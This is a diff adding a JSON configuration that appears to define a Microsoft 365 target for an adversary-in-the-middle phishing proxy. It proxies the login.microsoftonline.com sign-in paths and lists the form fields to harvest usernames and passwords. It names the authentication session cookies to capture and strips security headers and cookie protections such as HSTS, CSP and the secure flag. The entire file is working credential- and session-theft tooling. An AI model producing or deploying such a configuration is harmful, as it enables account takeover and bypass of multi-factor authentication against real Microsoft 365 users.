@@ -1,0 +1,37 @@
+{
+  "name": "microsoft",
+  "label": "Microsoft 365",
+  "upstream": "https://login.microsoftonline.com",
+  "proxy_paths": [
+    "/",
+    "/common/",
+    "/organizations/",
+    "/consumers/",
+    "/kmsi",
+    "/login",
+    "/SAS/",
+    "/federation/"
+  ],
+  "credential_fields": {
+    "username": ["loginfmt", "login", "email", "username"],
+    "password": ["passwd", "password", "Password", "secret"]
+  },
+  "session_cookies": [
+    "ESTSAUTH",
+    "ESTSAUTHPERSISTENT",
+    "ESTSAUTHLIGHT",
+    "SignInStateCookie",
+    "fpc",
+    "esctx",
+    "x-ms-gateway-slice",
+    "stsservicecookie"
+  ],
+  "rewrite": {
+    "strip_csp": true,
+    "strip_xfo": true,
+    "strip_hsts": true,
+    "strip_cookie_secure": true,
+    "strip_cookie_domain": true,
+    "rewrite_location": true
+  }
+}
